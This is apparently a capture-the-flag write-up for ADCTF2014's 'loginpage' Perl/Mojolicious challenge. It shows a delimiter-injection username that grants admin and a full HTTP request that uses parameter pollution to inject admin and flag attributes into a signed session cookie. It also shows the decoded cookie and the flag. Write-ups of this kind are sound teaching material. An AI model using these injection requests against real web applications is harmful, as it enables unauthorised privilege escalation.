### Solved by historypeats

>You can't guess LOGINPAGE_SECRET absolutely, it's not answer. So, maybe there are some vulnerability and you got an admin and flag.

>I wrote this web app on Oct. 28 2014. Perl is awesome language and I love it :)

>http://loginpage.adctf2014.katsudon.org/

WriteUp:

This challenge required is to login as an "admin" user as well as have the give_me_flag bit set to True. The give_me_flag and isadmin values are stored in the user's cookie when they authenticate. So we need to find a way to manipulate this information for both isadmin and give_me_flag to be True so we get the Flag. 

The first thing I noticed is that the user's credentials and admin rights are stored in a file with a semi-colon delimiter. So the format of user entries in the file looks like the following:

```text
username:password:isadmin
```

The easy way to exploit this is to create a user with the username with all the fields we want. For example, in the user registration page, our username field would be "testuser:testpassword:1" and the password field would be kept blank.

This successfully worked, and we can login as admin. However, the next condition we must meet in order to get the Flag is to have the give_me_flag value set to True in our cookie. I spent some time tinkering with this, including trying to find known vulnerabiilties with the Mojolicious framework and length-extension attacks (This obviously didn't work since there's an HMAC, but I thought I'd try anyway).

None of the options I attempted worked. However, I did stumble upon a cool blogpost (http://blog.gerv.net/2014/10/new-class-of-vulnerability-in-perl-web-applications/) on a "new" vulnerability surfacing in Perl web frameworks. Basically, using HTTP parameter pollution, you can override/create attributes in objects. In this case, we want to override both the isadmin and give_me_flag attributes to be True.

So in the end, we create a regular user, the login with the following tampered request:

```text
POST /login HTTP/1.1
Host: loginpage.adctf2014.katsudon.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://loginpage.adctf2014.katsudon.org/login
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

name=hey&pass=dude&pass=1&pass=things&pass=give_me_flag&pass=give_me_flag&pass=money&pass=2&pass=3&pass=admin&pass=admin
```

And we are returned the following cookie in the response:

```text
HTTP/1.1 302 Found
Server: nginx
Date: Fri, 19 Dec 2014 19:01:18 GMT
Content-Length: 0
Connection: keep-alive
Set-Cookie: mojolicious=eyJ1c2VyIjp7ImFkbWluIjoiZ2l2ZV9tZV9mbGFnIiwibW9uZXkiOiIyIiwiMyI6ImFkbWluIiwiZ2l2ZV9tZV9mbGFnIjoiZ2l2ZV9tZV9mbGFnIiwibmFtZSI6ImhleSIsIjAiOm51bGwsIjEiOiJ0aGluZ3MiLCJwYXNzIjoiZHVkZSJ9LCJleHBpcmVzIjoxNDE5MDE5Mjc4fQ----e6cecbe13fb30a8dd08b1caae74f6eb5ad4b09e1; expires=Fri, 19 Dec 2014 20:01:18 GMT; path=/; HttpOnly
Location: /
```

Decoding the cookie, we can see we've successfully poisoned the attributes:

```text
{"user":{"admin":"give_me_flag","money":"2","3":"admin","give_me_flag":"give_me_flag","name":"hey","0":null,"1":"things","pass":"dude"},"expires":1419019278}
```

Then we are redirected to index page and returned the Flag:

ADCTF_L0v3ry_p3rl_c0N73x7
